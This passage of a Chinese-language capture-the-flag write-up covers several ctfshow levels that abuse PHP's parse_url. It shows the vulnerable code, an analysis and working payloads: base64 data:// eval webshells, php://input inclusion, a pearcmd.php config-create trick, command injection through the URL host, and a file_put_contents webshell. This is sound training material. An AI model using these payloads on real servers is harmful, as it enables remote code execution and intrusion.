+</span></span><span class="line"><span class="cl">?u=http://data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span><span class="line"><span class="cl">// &lt;?php eval($_POST[1]); ?&gt;
+</span></span><span class="line"><span class="cl">POST: 1=system(&#34;ls /&#34;);
+</span></span><span class="line"><span class="cl">POST: 1=system(&#34;tac /_f1ag_1s_h3re.txt&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?u=http:data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=http://php:://input
+</span></span><span class="line"><span class="cl">POST: &lt;?php phpinfo(); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?u=ctfshow://data:://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL19mKicpOz8%2b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第三关">第三关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="分析">分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">scheme</span> <span class="nx">和</span> <span class="nx">path</span> <span class="nx">配合，scheme</span> <span class="nx">是</span> <span class="nx">http</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="o">://</span> <span class="nx">是可以省略掉两个斜杠的</span>
+</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="o">://</span><span class="nx">和http</span><span class="o">:</span><span class="nx">是一样的结果，因为这个函数只需要识别冒号前面的为http</span>
+</span></span><span class="line"><span class="cl"><span class="nx">而且在冒号后面的如果接的不是</span><span class="c1">//，后面的内容就会被识别为 path 而不是 host
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="s2">&#34;data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; data
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; ://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$data = parse_url(&#34;data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">print_r($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">echo $data[&#39;scheme&#39;].$data[&#39;path&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; data
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; text
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; /plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">data/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload-2">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=data:://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==
+</span></span><span class="line"><span class="cl">// &lt;?php eval($_POST[1]); ?&gt;
+</span></span><span class="line"><span class="cl">POST: 1=system(&#34;ls /&#34;);
+</span></span><span class="line"><span class="cl">POST: 1=system(&#34;tac /_f1a_g_1s_h3re&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=php:://input
+</span></span><span class="line"><span class="cl">POST: &lt;?php phpinfo(); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=..://aaa/../../../../../../usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1=ls /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第四关">第四关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="知识点">知识点</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${PWD} /var/www/html
+</span></span><span class="line"><span class="cl">${PWD::1} /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload-3">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">host会取最后一个冒号作为port的起始标志，最后需要加冒号，防止构造的paylaod被在中间截断
+</span></span><span class="line"><span class="cl">?u=http://ls ${PWD::1}:
+</span></span><span class="line"><span class="cl">?u=http://tac ${PWD::1}1_f1ag_1s_h3re:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=ctfshow://`echo &#39;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==&#39;|base64 -d`/h1xa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Array
+</span></span><span class="line"><span class="cl">(
+</span></span><span class="line"><span class="cl">    [scheme] =&gt; ctfshow
+</span></span><span class="line"><span class="cl">    [host] =&gt; `echo &#39;Y2F0IC8xX2YxYWdfMXNfaDNyZQ==&#39;|base64 -d`
+</span></span><span class="line"><span class="cl">    [path] =&gt; /h1xa
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?u=http://pwd;cd ..;pwd
+</span></span><span class="line"><span class="cl">结果：/var/www/html(第一个pwd) /var/www(第二个pwd)
+</span></span><span class="line"><span class="cl">使用cd切换目录之后，两次的pwd执行结果不同，代表切换目录成功
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?u=http://cd ..;cd ..;cd ..;cat 1_f1ag_1s_h3re
+</span></span><span class="line"><span class="cl">一直切换到根目录，然后找flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第五关">第五关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nv">$$$$$$host</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="题目分析-2">题目分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">变量覆盖
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="知识点-1">知识点</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">extract()：从数组中将变量导入到当前的符号表
+</span></span><span class="line"><span class="cl">parse_url()：返回的就是数组，相当于把数组的key变成了当前文件内的变量，数组的value就是变量的值
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print_r(parse_url(&#39;http://username:password@127.0.0.1:8080/index.php?id=1#abc&#39;));
+</span></span><span class="line"><span class="cl">输出为:
+</span></span><span class="line"><span class="cl">Array
+</span></span><span class="line"><span class="cl">(
+</span></span><span class="line"><span class="cl">    [scheme] =&gt; http
+</span></span><span class="line"><span class="cl">    [host] =&gt; 127.0.0.1
+</span></span><span class="line"><span class="cl">    [port] =&gt; 8080
+</span></span><span class="line"><span class="cl">    [user] =&gt; username
+</span></span><span class="line"><span class="cl">    [pass] =&gt; password
+</span></span><span class="line"><span class="cl">    [path] =&gt; /index.php
+</span></span><span class="line"><span class="cl">    [query] =&gt; id=1
+</span></span><span class="line"><span class="cl">    [fragment] =&gt; abc
+</span></span><span class="line"><span class="cl">)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload-4">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$host = scheme
+</span></span><span class="line"><span class="cl">$$host = $scheme = user
+</span></span><span class="line"><span class="cl">$$$host = $user = pass
+</span></span><span class="line"><span class="cl">$$$$host = $pass = query
+</span></span><span class="line"><span class="cl">$$$$$host = $query = fragment
+</span></span><span class="line"><span class="cl">$$$$$$host = $fragment
+</span></span><span class="line"><span class="cl">这里变量覆盖，不用port和path，大概因为port为端口，是数字，path前面会自带/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,&lt;?php system(&#34;ls /&#34;);?&gt;
+</span></span><span class="line"><span class="cl">?u=user://pass:query@scheme:8080/aaa?fragment%23data://text/plain,&lt;?php system(&#34;tac /_f1ag_1s_h3ree&#34;);?&gt;
+</span></span><span class="line"><span class="cl">注意：这里#需要进行%23编码，如果不写%23直接写#，#后的内容会被浏览器直接过滤掉。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?u=user://pass:query@scheme/?fragment%23data://,&lt;?php system(&#39;cat /_f1ag_1s_h3ree&#39;);?&gt;
+</span></span><span class="line"><span class="cl">?u=user://pass:query@scheme:3389/aaa?fragment%23php://input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="第六关">第六关</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;u&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="题目分析-3">题目分析</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">path前面自带一个</span><span class="o">/</span><span class="p">,</span> <span class="nx">不能访问根目录，需要写绝对路径到当前目录</span>
+</span></span><span class="line"><span class="cl"><span class="nx">不能有？，因为会被读取为query的值</span>
+</span></span><span class="line"><span class="cl"><span class="nx">长标签的后面的结束标签</span> <span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">有一个斜杠，后面的会被当成</span> <span class="nx">path</span> <span class="nx">处理，在script中可以没有</span> <span class="o">&lt;/</span><span class="nx">script</span> <span class="o">&gt;</span> <span class="nx">结束符号，只不过往后的所有代码都会被识别为script</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">()</span><span class="nx">函数将host的值作为内容写入path的值为文件名的文件中。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="s2">&#34;http://&lt;script language=&#39;php&#39;&gt;eval(</span><span class="si">$_POST[1]</span><span class="s2">);/var/www/html/1.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; &lt;script language=&#39;php&#39;&gt;eval();
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; /var/www/html/1.php
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;script language=&#39;php&#39;&gt;eval();
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$data = parse_url(&#34;http://&lt;?php eval($_POST[1]); ?&gt;/var/www/html/1.php&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">print_r($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">echo $data[&#39;host&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; &lt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    [query] =&gt; php eval(); ?&gt;/var/www/html/1.php
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">$data = parse_url(&#39;http://&lt;script language=&#34;php&#34;&gt; eval($_POST[1]); &lt;/script&gt;/var/www/html/1.php&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">print_r($data);
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">echo $data[&#39;host&#39;];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">输出结果：
+</span></span></span><span class="line"><span class="cl"><span class="err">Array
+</span></span></span><span class="line"><span class="cl"><span class="err">(
+</span></span></span><span class="line"><span class="cl"><span class="err">    [scheme] =&gt; http
+</span></span></span><span class="line"><span class="cl"><span class="err">    [host] =&gt; &lt;script language=&#34;php&#34;&gt; eval($_POST[1]); &lt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    [path] =&gt; /script&gt;/var/www/html/1.php
+</span></span></span><span class="line"><span class="cl"><span class="err">)
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;script language=&#34;php&#34;&gt; eval($_POST[1]); &lt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="知识点-2">知识点</h4>
+<h5 id="php常用标签">php常用标签</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.&lt;?php ?&gt;
+</span></span><span class="line"><span class="cl">2.&lt;? ?&gt;
+</span></span><span class="line"><span class="cl">3.&lt;script language=&#34;php&#34;&gt; &lt;/script&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="payload-5">payload</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?u=http://&lt;script language=&#39;php&#39;&gt;eval($_POST[1]);/var/www/html/1.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://5708d4ed-1067-4a90-9eb1-138bc4931d7e.challenge.ctf.show/1.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1=system(&#34;ls /&#34;);
+</span></span><span class="line"><span class="cl">1=system(&#34;tac /_f1a_g_1s_h3re&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
